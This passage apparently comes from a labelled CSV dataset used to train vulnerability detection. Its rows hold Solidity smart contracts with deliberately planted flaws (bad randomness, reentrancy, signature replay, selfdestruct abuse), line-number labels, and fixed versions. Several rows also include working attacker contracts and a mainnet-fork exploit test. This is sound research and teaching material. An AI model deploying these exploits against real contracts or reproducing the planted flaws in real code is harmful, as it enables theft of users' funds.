+        uint256 a = uint(keccak256(abi.encodePacked(slot))) +
+            (index * elementSize);
+        return bytes32(a);
+    }
+}
+","{25, 28}"
+32,32,D:\UoM\Final_Year_Project_New\vulnerability-detection-and-localization\datasets\DefiVulnLabs\src\test\Randomness_modified.sol,1,Randomness_modified.sol,0,"// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.18;
+
+/*
+Name: Predictable Randomness Vulnerability
+
+Description:
+Use of global variables like block hash, block number, 
+block timestamp and other fields is insecure, miner and attacker can control it.
+
+Scenario:
+GuessTheRandomNumber is a game where you win 1 Ether if you can guess the
+pseudo random number generated from block hash and timestamp.
+
+At first glance, it seems impossible to guess the correct number.
+But let's see how easy it is win.
+
+1. Alice deploys GuessTheRandomNumber with 1 Ether
+2. Eve deploys Attack
+3. Eve calls Attack.attack() and wins 1 Ether
+
+What happened?
+Attack computed the correct answer by simply copying the code that computes the random number.
+
+Mitigation:
+Don't use blockhash and block.timestamp as source of randomness
+
+REF:
+https://solidity-by-example.org/hacks/randomness/
+ 
+*/
+
+/*
+ * @vulnerable_at_lines: 41, 42, 43, 44, 45
+ */
+
+contract GuessTheRandomNumber {
+    constructor() payable {}
+
+    function guess(uint _guess) public {
+        uint answer = uint(
+            keccak256(
+                abi.encodePacked(blockhash(block.number - 1), block.timestamp)
+            )
+        );
+
+        if (_guess == answer) {
+            (bool sent, ) = msg.sender.call{value: 1 ether}("""");
+            require(sent, ""Failed to send Ether"");
+        }
+    }
+}
+
+contract Attack {
+    receive() external payable {}
+
+    function attack(GuessTheRandomNumber guessTheRandomNumber) public {
+        uint answer = uint(
+            keccak256(
+                abi.encodePacked(blockhash(block.number - 1), block.timestamp)
+            )
+        );
+
+        guessTheRandomNumber.guess(answer);
+    }
+
+    // Helper function to check balance
+    function getBalance() public view returns (uint) {
+        return address(this).balance;
+    }
+}
+","{41, 42, 43, 44, 45}"
+33,33,D:\UoM\Final_Year_Project_New\vulnerability-detection-and-localization\datasets\DefiVulnLabs\src\test\ReadOnlyReentrancy_modified.sol,1,ReadOnlyReentrancy_modified.sol,0,"// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.18;
+
+import ""./interface.sol"";
+/*
+Name: Read-Only Reentrancy Vulnerability
+
+Description:
+The Read-Only Reentrancy Vulnerability is a flaw in smart contract design that allows attackers 
+to exploit the ""read-only"" nature of a function to make unintended changes to the contract's state. 
+Specifically, the vulnerability arises when an attacker uses the remove_liquidity function of the ICurve contract 
+to trigger the receive function in the ExploitContract. This is achieved by an external call 
+from a secure smart contract ""A"" invoking the fallback() function in the attacker's contract.
+
+Through this exploit, the attacker gains the ability to execute code within the fallback() function
+against a target contract ""B,"" which is indirectly related to contract ""A."" Contract ""B"" derives
+the price of the LP token from Contract ""A,"" making it susceptible to manipulation and unintended price changes
+through the reentrancy attack.
+
+Mitigation:
+Avoid any state-changing operations within functions that are intended to be read-only.
+Makerdao example:
+        // This will revert if called during execution of a state-modifying pool function.
+        if (nonreentrant) {
+            uint256[2] calldata amounts;
+            CurvePoolLike(pool).remove_liquidity(0, amounts);
+        }
+
+REF
+https://twitter.com/1nf0s3cpt/status/1590622114834706432
+https://chainsecurity.com/heartbreaks-curve-lp-oracles/
+https://medium.com/@zokyo.io/read-only-reentrancy-attacks-understanding-the-threat-to-your-smart-contracts-99444c0a7334
+https://www.youtube.com/watch?v=0fgGTRlsDxI
+
+*/
+
+/*
+ * @vulnerable_at_lines: 85, 86
+ */
+
+interface ICurve {
+    function get_virtual_price() external view returns (uint);
+
+    function add_liquidity(
+        uint[2] calldata amounts,
+        uint min_mint_amount
+    ) external payable returns (uint);
+
+    function remove_liquidity(
+        uint lp,
+        uint[2] calldata min_amounts
+    ) external returns (uint[2] memory);
+
+    function remove_liquidity_one_coin(
+        uint lp,
+        int128 i,
+        uint min_amount
+    ) external returns (uint);
+}
+
+address constant STETH_POOL = 0xDC24316b9AE028F1497c275EB9192a3Ea0f67022;
+address constant LP_TOKEN = 0x06325440D014e39736583c165C2963BA99fAf14E; //steCRV Token
+
+// VulnContract
+// users stake LP_TOKEN
+// getReward rewards the users based on the current price of the pool LP token
+contract VulnContract {
+    IERC20 public constant token = IERC20(LP_TOKEN);
+    ICurve private constant pool = ICurve(STETH_POOL);
+
+    mapping(address => uint) public balanceOf;
+
+    function stake(uint amount) external {
+        token.transferFrom(msg.sender, address(this), amount);
+        balanceOf[msg.sender] += amount;
+    }
+
+    function unstake(uint amount) external {
+        balanceOf[msg.sender] -= amount;
+        token.transfer(msg.sender, amount);
+    }
+
+    function getReward() external view returns (uint) {
+        //rewarding tokens based on the current virtual price of the pool LP token
+        uint reward = (balanceOf[msg.sender] * pool.get_virtual_price()) /
+            1 ether;
+        // Omitting code to transfer reward tokens
+        return reward;
+    }
+}
+
+contract ExploitContract {
+    ICurve private constant pool = ICurve(STETH_POOL);
+    IERC20 public constant lpToken = IERC20(LP_TOKEN);
+    VulnContract private immutable target;
+
+    constructor(address _target) {
+        target = VulnContract(_target);
+    }
+
+    // Stake LP into VulnContract
+    function stakeTokens() external payable {
+        uint[2] memory amounts = [msg.value, 0];
+        uint lp = pool.add_liquidity{value: msg.value}(amounts, 1);
+
+        lpToken.approve(address(target), lp);
+        target.stake(lp);
+    }
+
+    // Perform Read-Only Reentrancy
+    function performReadOnlyReentrnacy() external payable {
+        // Add liquidity to Curve
+        uint[2] memory amounts = [msg.value, 0];
+        uint lp = pool.add_liquidity{value: msg.value}(amounts, 1);
+        
+        // Remove liquidity from Curve
+        // remove_liquidity() invokes the recieve() callback
+        uint[2] memory min_amounts = [uint(0), uint(0)];
+        pool.remove_liquidity(lp, min_amounts);
+
+        // Attack - Log reward amount
+        uint reward = target.getReward();
+    }
+
+    receive() external payable {
+        // receive() is called when the remove_liquidity is called
+        // Attack - Log reward amount
+        uint reward = target.getReward();
+    }
+}
+","{85, 86}"
+34,34,D:\UoM\Final_Year_Project_New\vulnerability-detection-and-localization\datasets\DefiVulnLabs\src\test\recoverERC20_modified.sol,1,recoverERC20_modified.sol,0,"// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.18;
+
+import ""@openzeppelin/contracts/token/ERC20/ERC20.sol"";
+import ""@openzeppelin/contracts/access/Ownable.sol"";
+import ""@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol"";
+
+/*
+Name: Incorrect implementation of the recoverERC20() function in the StakingRewards
+
+Description:
+The recoverERC20() function in StakingRewards.sol can potentially serve as a backdoor for the owner to retrieve rewardsToken.
+There is no corresponding check against the rewardsToken. This creates an administrative privilege where the owner can sweep the rewards tokens, potentially using it as a means to exploit depositors.
+It's similar to a forked issue if you forked vulnerable code.
+ 
+Mitigation:  
+disallowing recovery of the rewardToken within the recoverErc20 function
+
+REF:
+https://twitter.com/1nf0s3cpt/status/1680806251482189824
+https://github.com/code-423n4/2022-02-concur-findings/issues/210
+https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/49
+https://github.com/code-423n4/2022-10-paladin-findings/issues/40
+https://blog.openzeppelin.com/across-token-and-token-distributor-audit#anyone-can-prevent-stakers-from-getting-their-rewards
+*/
+
+/*
+ * @vulnerable_at_lines: 53, 49
+ */
+
+contract VulnStakingRewards {
+    using SafeERC20 for IERC20;
+
+    IERC20 public rewardsToken;
+    address public owner;
+
+    event Recovered(address token, uint256 amount);
+
+    constructor(address _rewardsToken) {
+        rewardsToken = IERC20(_rewardsToken);
+        owner = msg.sender;
+    }
+
+    modifier onlyOwner() {
+        require(msg.sender == owner, ""Only owner can call this function"");
+        _;
+    }
+
+    function recoverERC20(
+        address tokenAddress,
+        uint256 tokenAmount
+    ) public onlyOwner {
+        IERC20(tokenAddress).safeTransfer(owner, tokenAmount);
+        emit Recovered(tokenAddress, tokenAmount);
+    }
+}
+
+contract FixedtakingRewards {
+    using SafeERC20 for IERC20;
+
+    IERC20 public rewardsToken;
+    address public owner;
+
+    event Recovered(address token, uint256 amount);
+
+    constructor(address _rewardsToken) {
+        rewardsToken = IERC20(_rewardsToken);
+        owner = msg.sender;
+    }
+
+    modifier onlyOwner() {
+        require(msg.sender == owner, ""Only owner can call this function"");
+        _;
+    }
+
+    function recoverERC20(
+        address tokenAddress,
+        uint256 tokenAmount
+    ) external onlyOwner {
+        require(
+            tokenAddress != address(rewardsToken),
+            ""Cannot withdraw the rewardsToken""
+        );
+        IERC20(tokenAddress).safeTransfer(owner, tokenAmount);
+        emit Recovered(tokenAddress, tokenAmount);
+    }
+}
+
+contract RewardToken is ERC20, Ownable {
+    constructor() ERC20(""Rewardoken"", ""Reward"") {
+        _mint(msg.sender, 10000 * 10 ** decimals());
+    }
+}
+","{49, 53}"
+35,35,D:\UoM\Final_Year_Project_New\vulnerability-detection-and-localization\datasets\DefiVulnLabs\src\test\Reentrancy_modified.sol,1,Reentrancy_modified.sol,0,"// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.18;
+
+/*
+Name: Reentrancy Vulnerability
+
+Description:
+The EtherStore Reentrancy Vulnerability is a flaw in the smart contract design that allows 
+an attacker to exploit reentrancy and withdraw more funds than they are entitled to from the EtherStore contract. 
+The vulnerability arises due to the withdrawFunds function in the EtherStore contract,
+where the Ether is transferred to the attacker's address before updating their balance. 
+This allows the attacker's contract to make a reentrant call back to the withdrawFunds function before the balance update, 
+leading to multiple withdrawals and potentially draining all the Ether from the EtherStore contract.
+
+Scenario:
+EtherStore is a simple vault, it can manage everyone's ethers.
+But it's vulnerable, can you steal all the ethers ?
+
+Mitigation:
+Follow check-effect-interaction and use OpenZeppelin Reentrancy Guard.
+
+REF
+https://slowmist.medium.com/introduction-to-smart-contract-vulnerabilities-reentrancy-attack-2893ec8390a
+https://consensys.github.io/smart-contract-best-practices/attacks/reentrancy/
+
+*/
+
+/*
+ * @vulnerable_at_lines: 41, 46, 45, 47
+ */
+
+contract EtherStore {
+    mapping(address => uint256) public balances;
+
+    function deposit() public payable {
+        balances[msg.sender] += msg.value;
+    }
+
+    function withdrawFunds(uint256 _weiToWithdraw) public {
+        require(balances[msg.sender] >= _weiToWithdraw);
+        (bool send, ) = msg.sender.call{value: _weiToWithdraw}("""");
+        require(send, ""send failed"");
+
+        // check if after send still enough to avoid underflow
+        if (balances[msg.sender] >= _weiToWithdraw) {
+            balances[msg.sender] -= _weiToWithdraw;
+        }
+    }
+}
+
+contract EtherStoreRemediated {
+    mapping(address => uint256) public balances;
+    bool internal locked;
+
+    modifier nonReentrant() {
+        require(!locked, ""No re-entrancy"");
+        locked = true;
+        _;
+        locked = false;
+    }
+
+    function deposit() public payable {
+        balances[msg.sender] += msg.value;
+    }
+
+    function withdrawFunds(uint256 _weiToWithdraw) public nonReentrant {
+        require(balances[msg.sender] >= _weiToWithdraw);
+        balances[msg.sender] -= _weiToWithdraw;
+        (bool send, ) = msg.sender.call{value: _weiToWithdraw}("""");
+        require(send, ""send failed"");
+    }
+}
+
+contract EtherStoreAttack {
+    EtherStore store;
+
+    constructor(address _store) {
+        store = EtherStore(_store);
+    }
+
+    function Attack() public {
+        store.deposit{value: 1 ether}();
+
+        store.withdrawFunds(1 ether); // exploit here
+    }
+
+    // fallback() external payable {}
+
+    // we want to use fallback function to exploit reentrancy
+    receive() external payable {
+        if (address(store).balance >= 1 ether) {
+            store.withdrawFunds(1 ether); // exploit here
+        }
+    }
+}
+","{41, 45, 46, 47}"
+36,36,D:\UoM\Final_Year_Project_New\vulnerability-detection-and-localization\datasets\DefiVulnLabs\src\test\return-break_modified.sol,1,return-break_modified.sol,0,"// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.18;
+
+/*
+Name: Use of return in inner loop iteration leads to unintended termination. 
+
+Description:
+BankContractBug's addBanks function exhibits an incorrect usage of the return statement within a loop iteration, 
+resulting in unintended termination of the loop. The return statement is placed inside the inner loop, 
+causing premature exit from the function before completing the iteration over all bank addresses. 
+
+Mitigation:  
+Use break instead of return
+
+REF:
+https://twitter.com/1nf0s3cpt/status/1678596730865221632
+https://github.com/code-423n4/2022-03-lifinance-findings/issues/34
+https://solidity-by-example.org/loop/
+
+*/
+
+/*
+ * @vulnerable_at_lines: 51
+ */
+
+contract BankContractBug {
+    struct Bank {
+        address bankAddress;
+        string bankName;
+    }
+
+    Bank[] public banks;
+
+    function addBanks(
+        address[] memory bankAddresses,
+        string[] memory bankNames
+    ) public {
+        require(
+            bankAddresses.length == bankNames.length,
+            ""Input arrays must have the same length.""
+        );
+
+        for (uint i = 0; i < bankAddresses.length; i++) {
+            if (bankAddresses[i] == address(0)) {
+                continue;
+            }
+
+            // i++ is not executed when return is executed
+            for (i = 0; i < bankAddresses.length; i++) {
+                banks.push(Bank(bankAddresses[i], bankNames[i]));
+                return;
+            }
+        }
+    }
+
+    function getBankCount() public view returns (uint) {
+        return banks.length;
+    }
+}
+
+contract FixedBank {
+    struct Bank {
+        address bankAddress;
+        string bankName;
+    }
+
+    Bank[] public banks;
+
+    function addBanks(
+        address[] memory bankAddresses,
+        string[] memory bankNames
+    ) public {
+        require(
+            bankAddresses.length == bankNames.length,
+            ""Input arrays must have the same length.""
+        );
+
+        for (uint i = 0; i < bankAddresses.length; i++) {
+            if (bankAddresses[i] == address(0)) {
+                continue;
+            }
+
+            for (uint i = 0; i < bankAddresses.length; i++) {
+                banks.push(Bank(bankAddresses[i], bankNames[i]));
+                break; // Correct usage of break to terminate the inner loop
+            }
+        }
+    }
+
+    function getBankCount() public view returns (uint) {
+        return banks.length;
+    }
+}
+",{51}
+37,37,D:\UoM\Final_Year_Project_New\vulnerability-detection-and-localization\datasets\DefiVulnLabs\src\test\Returnfalse_modified.sol,-1,Returnfalse_modified.sol,1,"// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.18;
+
+import ""forge-std/Test.sol"";
+
+import ""@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol"";
+import ""@openzeppelin/contracts/token/ERC20/IERC20.sol"";
+
+/*
+Name: No Revert on Failure
+
+Description:
+Some tokens do not revert on failure, but instead return false (e.g. ZRX).
+
+ZRX transfer return false:
+    function transfer(address _to, uint _value) returns (bool) {
+        //Default assumes totalSupply can't be over max (2^256 - 1).
+        if (balances[msg.sender] >= _value && balances[_to] + _value >= balances[_to]) {
+            balances[msg.sender] -= _value;
+            balances[_to] += _value;
+            Transfer(msg.sender, _to, _value);
+            return true;
+        } else { return false; }
+    }
+
+Mitigation:
+Use OpenZeppelin’s SafeERC20 library and change transfer to safeTransfer.
+*/
+
+/*
+ * @vulnerable_at_lines: -1
+ */
+
+contract ContractTest is Test {
+    using SafeERC20 for IERC20;
+    IERC20 constant zrx = IERC20(0xE41d2489571d322189246DaFA5ebDe1F4699F498);
+
+    function setUp() public {
+        vm.createSelectFork(""mainnet"", 16138254);
+    }
+
+    function testTransfer() public {
+        vm.startPrank(0xef0DCc839c1490cEbC7209BAa11f46cfe83805ab);
+        zrx.transfer(address(this), 123); //return false, do not revert
+        vm.stopPrank();
+    }
+
+    function testSafeTransferFail() public {
+        vm.startPrank(0xef0DCc839c1490cEbC7209BAa11f46cfe83805ab);
+
+        // https://github.com/foundry-rs/foundry/issues/5367 can't vm.expectRevert
+        // vm.expectRevert(""SafeERC20: ERC20 operation did not succeed"");
+        zrx.safeTransfer(address(this), 123); //revert
+
+        vm.stopPrank();
+    }
+
+    receive() external payable {}
+}
+",{-1}
+38,38,D:\UoM\Final_Year_Project_New\vulnerability-detection-and-localization\datasets\DefiVulnLabs\src\test\Returnvalue_modified.sol,-1,Returnvalue_modified.sol,1,"// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.18;
+
+import ""forge-std/Test.sol"";
+import ""@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol"";
+
+/*
+Name: Unchecked return value
+
+Description:
+EIP20 standard:
+Returns a boolean value indicating whether the operation succeeded.
+function transfer(address to, uint256 amount) external returns (bool);
+
+USDT doesn't correctly implement the EIP20 standard,
+so calling these functions with the correct EIP20 function signatures will always revert.
+function transfer(address to, uint256 value) external;
+
+ERC20 transfer:
+    function transfer(address to, uint256 amount) public virtual returns (bool) {
+        address owner = _msgSender();
+        _transfer(owner, to, amount);
+        return true;
+    }
+
+USDT transfer without a return value:
+    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {
+        ...
+        }
+        Transfer(msg.sender, _to, sendAmount);
+    }
+
+Mitigation:
+Use OpenZeppelin’s SafeERC20 library and change transfer to safeTransfer.
+
+REF:
+https://twitter.com/1nf0s3cpt/status/1600868995007410176
+
+*/
+
+/*
+ * @vulnerable_at_lines: -1
+ */
+
+interface USDT {
+    function transfer(address to, uint256 value) external;
+
+    function balanceOf(address account) external view returns (uint256);
+
+    function approve(address spender, uint256 value) external;
+}
+
+contract ContractTest is Test {
+    using SafeERC20 for IERC20;
+    IERC20 constant usdt = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
+
+    function setUp() public {
+        vm.createSelectFork(""mainnet"", 16138254);
+    }
+
+    function testTransfer() public {
+        vm.startPrank(0xef0DCc839c1490cEbC7209BAa11f46cfe83805ab);
+        usdt.transfer(address(this), 123); //revert
+        vm.stopPrank();
+    }
+
+    function testSafeTransfer() public {
+        vm.startPrank(0xef0DCc839c1490cEbC7209BAa11f46cfe83805ab);
+        usdt.safeTransfer(address(this), 123);
+        vm.stopPrank();
+    }
+
+    receive() external payable {}
+}
+",{-1}
+39,39,D:\UoM\Final_Year_Project_New\vulnerability-detection-and-localization\datasets\DefiVulnLabs\src\test\self-transfer_modified.sol,1,self-transfer_modified.sol,0,"// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.18;
+
+/*
+Name: Missing Check for Self-Transfer Allows Funds to be Lost
+
+Description:
+The vulnerability in the code stems from the absence of a check to prevent self-transfers. 
+This oversight allows the transfer function to erroneously transfer funds to the same address. 
+Consequently, funds are lost as the code fails to deduct the transferred amount from the sender's balance.
+This vulnerability undermines the correctness of fund transfers within the contract and poses a risk 
+to the integrity of user balances.
+ 
+Mitigation:  
+Add condition to prevent transfer between same addresses
+
+REF:
+https://twitter.com/1nf0s3cpt/status/1679373800327241728
+https://github.com/code-423n4/2022-10-traderjoe-findings/issues/299
+https://www.immunebytes.com/blog/bzxs-security-focused-relaunch-followed-by-a-hack-how/
+*/
+
+/*
+ * @vulnerable_at_lines: 41, 40, 39, 42
+ */
+
+contract SimpleBank {
+    mapping(address => uint256) private _balances;
+
+    function balanceOf(address _account) public view virtual returns (uint256) {
+        return _balances[_account];
+    }
+
+    function transfer(address _from, address _to, uint256 _amount) public {
+        // not check self-transfer
+        uint256 _fromBalance = _balances[_from];
+        uint256 _toBalance = _balances[_to];
+
+        unchecked {
+            _balances[_from] = _fromBalance - _amount;
+            _balances[_to] = _toBalance + _amount;
+        }
+    }
+}
+
+contract FixedSimpleBank {
+    mapping(address => uint256) private _balances;
+
+    function balanceOf(address _account) public view virtual returns (uint256) {
+        return _balances[_account];
+    }
+
+    function transfer(address _from, address _to, uint256 _amount) public {
+        //Mitigation
+        require(_from != _to, ""Cannot transfer funds to the same address."");
+
+        uint256 _fromBalance = _balances[_from];
+        uint256 _toBalance = _balances[_to];
+
+        unchecked {
+            _balances[_from] = _fromBalance - _amount;
+            _balances[_to] = _toBalance + _amount;
+            /*
+            Another mitigation
+            _balances[_id][_from] -= _amount;
+            _balances[_id][_to] += _amount;
+            */
+        }
+    }
+}
+","{40, 41, 42, 39}"
+40,40,D:\UoM\Final_Year_Project_New\vulnerability-detection-and-localization\datasets\DefiVulnLabs\src\test\Selfdestruct_modified.sol,1,Selfdestruct_modified.sol,0,"// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.18;
+/*
+Name: Self-Destruct Vulnerability
+
+Description:
+The EtherGame Self-Destruct Vulnerability is a flaw in the smart contract code that allows an attacker 
+to disrupt the game by causing the EtherGame contract to self-destruct (using the selfdestruct opcode). 
+The vulnerability arises due to the dos function in the Attack contract, which performs a self-destruct
+operation on the EtherGame contract after receiving a significant amount of Ether. As a result of the self-destruct, 
+the EtherGame contract's functionality is permanently disabled, making it impossible for anyone to deposit or claim the winner's reward.
+
+Scenario:
+1. Deploy EtherGame
+2. Players (say Alice and Bob) decides to play, deposits 1 Ether each.
+2. Deploy Attack with address of EtherGame
+3. Call Attack.attack sending 5 ether. This will break the game No one can become the winner.
+
+What happened?
+Attack forced the balance of EtherGame to equal 7 ether.
+Now no one can deposit and the winner cannot be set.
+Due to missing or insufficient access controls, malicious parties can self-destruct the contract.
+The selfdestruct(address) function removes all bytecode from the contract address and sends all ether stored to the specified address.
+
+Mitigation:
+Instead of relying on this.balance to track the deposited Ether, 
+use a state variable to keep track of the total deposited amount.
+*/
+
+/*
+ * @vulnerable_at_lines: 41
+ */
+
+contract EtherGame {
+    uint public constant targetAmount = 7 ether;
+    address public winner;
+
+    function deposit() public payable {
+        require(msg.value == 1 ether, ""You can only send 1 Ether"");
+
+        uint balance = address(this).balance; // vulnerable
+        require(balance <= targetAmount, ""Game is over"");
+
+        if (balance == targetAmount) {
+            winner = msg.sender;
+        }
+    }
+
+    function claimReward() public {
+        require(msg.sender == winner, ""Not winner"");
+
+        (bool sent, ) = msg.sender.call{value: address(this).balance}("""");
+        require(sent, ""Failed to send Ether"");
+    }
+}
+
+contract Attack {
+    EtherGame etherGame;
+
+    constructor(EtherGame _etherGame) {
+        etherGame = EtherGame(_etherGame);
+    }
+
+    function dos() public payable {
+        // You can simply break the game by sending ether so that
+        // the game balance >= 7 ether
+
+        // cast address to payable
+        address payable addr = payable(address(etherGame));
+        selfdestruct(addr);
+    }
+}
+",{41}
+41,41,D:\UoM\Final_Year_Project_New\vulnerability-detection-and-localization\datasets\DefiVulnLabs\src\test\Selfdestruct2_modified.sol,1,Selfdestruct2_modified.sol,1,"// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.18;
+
+/*
+This excersise is about selfdestructing (deprecated) and force sending ether to a contract
+Force implements neither receive nor fallaback functions. Calls with any value will revert.
+*/
+
+/*
+ * @vulnerable_at_lines: 13
+ */
+
+contract Force {
+    /*
+
+                   MEOW ?
+         /\_/\   /
+    ____/ o o \
+  /~____  =ø= /
+ (______)__m_m)
+
+*/
+}
+
+contract Attack {
+    function attack(address force) public payable {
+        selfdestruct(payable(force));
+    }
+}
+",{13}
+42,42,D:\UoM\Final_Year_Project_New\vulnerability-detection-and-localization\datasets\DefiVulnLabs\src\test\SenseFinance_exp_modified.sol,-1,SenseFinance_exp_modified.sol,1,"// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.18;
+
+import ""forge-std/Test.sol"";
+import ""./interface.sol"";
+
+// this excersise is about direct token manipulation
+
+/*
+ * @vulnerable_at_lines: -1
+ */
+
+interface ISpace {
+    function onSwap(
+        SwapRequest memory request,
+        uint256 reservesTokenIn,
+        uint256 reservesTokenOut
+    ) external returns (uint256);
+
+    struct SwapRequest {
+        IVault.SwapKind kind;
+        IERC20 tokenIn;
+        IERC20 tokenOut;
+        uint256 amount;
+        // Misc data
+        bytes32 poolId;
+        uint256 lastChangeBlock;
+        address from;
+        address to;
+        bytes userData;
+    }
+}
+
+interface IVault {
+    enum SwapKind {
+        GIVEN_IN,
+        GIVEN_OUT
+    }
+}
+
+contract ContractTest is DSTest {
+    ISpace space = ISpace(0x3f9FEe026fCebb40719A69416C72B714d89a17d9);
+    IVault.SwapKind kind = IVault.SwapKind(0);
+    ISpace.SwapRequest aad =
+        ISpace.SwapRequest(
+            kind,
+            IERC20(0x3f9FEe026fCebb40719A69416C72B714d89a17d9),
+            IERC20(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0),
+            2000000000000000000,
+            0x3f9fee026fcebb40719a69416c72b714d89a17d900020000000000000000017c,
+            15017009,
+            address(this),
+            address(this),
+            """"
+        );
+    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
+
+    function setUp() public {
+        cheats.createSelectFork(""mainnet"", 15017009); //fork mainnet at block 15017009
+    }
+
+    function testExploit() public {
+        //onswap:reservesTokenIn, reservesTokenOut;
+        console.log(
+            ""Amount Calculated:"",
+            space.onSwap(
+                aad,
+                60000000000000000000000000000000,
+                20000000000000000000000000
+            )
+        ); //744039785002747962
+        console.log(
+            ""Manipulated Amount Calculated:"",
+            space.onSwap(aad, 2000000000000000000, 2000000000000000000)
+        ); //1860147027671744844
+    }
+}
+",{-1}
+43,43,D:\UoM\Final_Year_Project_New\vulnerability-detection-and-localization\datasets\DefiVulnLabs\src\test\SignatureReplay_modified.sol,1,SignatureReplay_modified.sol,0,"// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.18;
+
+/*
+Name: Signature Replay Vulnerability
+
+Description:
+In this scenario, Alice signs a transaction that allows Bob to transfer tokens from Alice's account 
+to Bob's account. Bob then replays this signature on multiple contracts 
+(in this case, the TokenWhale and SixEyeToken contracts), each time authorizing the transfer of tokens 
+from Alice's account to his. This is possible because the contracts use the same methodology for signing
+and validating transactions, but they do not share a nonce to prevent replay attacks.
+
+Missing protection against signature replay attacks, Same signature can be used multiple times to execute a function.
+
+Mitigation:
+Replay attacks can be prevented by implementing a nonce, a number that is only used once, into the signing and verification process. 
+
+REF:
+https://medium.com/cryptronics/signature-replay-vulnerabilities-in-smart-contracts-3b6f7596df57
+https://medium.com/cypher-core/replay-attack-vulnerability-in-ethereum-smart-contracts-introduced-by-transferproxy-124bf3694e25
+
+*/
+
+/*
+ * @vulnerable_at_lines: 118
+ */
+
+contract TokenWhale {
+    address player;
+
+    uint256 public totalSupply;
+    mapping(address => uint256) public balanceOf;
+    mapping(address => mapping(address => uint256)) public allowance;
+
+    string public name = ""Simple ERC20 Token"";
+    string public symbol = ""SET"";
+    uint8 public decimals = 18;
+    mapping(address => uint256) nonces;
+
+    function TokenWhaleDeploy(address _player) public {
+        player = _player;
+        totalSupply = 2000;
+        balanceOf[player] = 2000;
+    }
+
+    function _transfer(address to, uint256 value) internal {
+        balanceOf[msg.sender] -= value;
+        balanceOf[to] += value;
+    }
+
+    function transfer(address to, uint256 value) public {
+        require(balanceOf[msg.sender] >= value);
+        require(balanceOf[to] + value >= balanceOf[to]);
+
+        _transfer(to, value);
+    }
+
+    function transferProxy(
+        address _from,
+        address _to,
+        uint256 _value,
+        uint256 _feeUgt,
+        uint8 _v,
+        bytes32 _r,
+        bytes32 _s
+    ) public returns (bool) {
+        uint256 nonce = nonces[_from];
+        bytes32 h = keccak256(
+            abi.encodePacked(_from, _to, _value, _feeUgt, nonce)
+        );
+        if (_from != ecrecover(h, _v, _r, _s)) revert();
+
+        if (
+            balanceOf[_to] + _value < balanceOf[_to] ||
+            balanceOf[msg.sender] + _feeUgt < balanceOf[msg.sender]
+        ) revert();
+        balanceOf[_to] += _value;
+
+        balanceOf[msg.sender] += _feeUgt;
+
+        balanceOf[_from] -= _value + _feeUgt;
+        nonces[_from] = nonce + 1;
+        return true;
+    }
+}
+
+contract SixEyeToken {
+    address player;
+
+    uint256 public totalSupply;
+    mapping(address => uint256) public balanceOf;
+    mapping(address => mapping(address => uint256)) public allowance;
+
+    string public name = ""Six Eye Token"";
+    string public symbol = ""SIX"";
+    uint8 public decimals = 18;
+    mapping(address => uint256) nonces;
+
+    function TokenWhaleDeploy(address _player) public {
+        player = _player;
+        totalSupply = 2000;
+        balanceOf[player] = 2000;
+    }
+
+    function _transfer(address to, uint256 value) internal {
+        balanceOf[msg.sender] -= value;
+        balanceOf[to] += value;
+    }
+
+    function transfer(address to, uint256 value) public {
+        require(balanceOf[msg.sender] >= value);
+        require(balanceOf[to] + value >= balanceOf[to]);
+
+        _transfer(to, value);
+    }
+
+    function transferProxy(
+        address _from,
+        address _to,
+        uint256 _value,
+        uint256 _feeUgt,
+        uint8 _v,
+        bytes32 _r,
+        bytes32 _s
+    ) public returns (bool) {
+        uint256 nonce = nonces[_from];
+        bytes32 h = keccak256(
+            abi.encodePacked(_from, _to, _value, _feeUgt, nonce)
+        );
+        if (_from != ecrecover(h, _v, _r, _s)) revert();
+
+        if (
+            balanceOf[_to] + _value < balanceOf[_to] ||
+            balanceOf[msg.sender] + _feeUgt < balanceOf[msg.sender]
+        ) revert();
+        balanceOf[_to] += _value;
+
+        balanceOf[msg.sender] += _feeUgt;
+
+        balanceOf[_from] -= _value + _feeUgt;
+        return true;
+    }
+}
+",{118}
+44,44,D:\UoM\Final_Year_Project_New\vulnerability-detection-and-localization\datasets\DefiVulnLabs\src\test\SignatureReplayNBA_modified.sol,1,SignatureReplayNBA_modified.sol,0,"// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.18;
+
+/*
+We use NBA NFT incident as an example.
+
+‘Association NFT’ collection by the NBA, which triggers the ‘Allow list’ to sell out permanently. 
+
+This vulnerability could’ve allowed any malicious entity to mint several NFTs without paying any tokens. 
+
+This contract fails to verify that a signature can be used only once.
+*/
+
+/*
+ * @vulnerable_at_lines: 63, 96, 59
+ */
+
+interface INBA {
+    struct vData {
+        bool mint_free;
+        uint256 max_mint;
+        address from;
+        uint256 start;
+        uint256 end;
+        uint256 eth_price;
+        uint256 dust_price;
+        bytes signature;
+    }
+
+    function mint_approved(
+        vData memory info,
+        uint256 number_of_items_requested,
+        uint16 _batchNumber
+    ) external;
+}
+
+contract NBA {
+    uint16 public batchNumber;
+
+    address signer = 0x669F499e7BA51836BB76F7dD2bc3C1A37a5342D7;
+    struct vData {
+        bool mint_free;
+        uint256 max_mint;
+        address from;
+        uint256 start;
+        uint256 end;
+        uint256 eth_price;
+        uint256 dust_price;
+        bytes signature;
+    }
+
+    function mint_approved(
+        vData memory info,
+        uint256 number_of_items_requested,
+        uint16 _batchNumber
+    ) external view {
+        require(batchNumber == _batchNumber, ""!batch"");
+        // address from = msg.sender;
+        require(verify(info), ""Unauthorised access secret""); // check whitelist
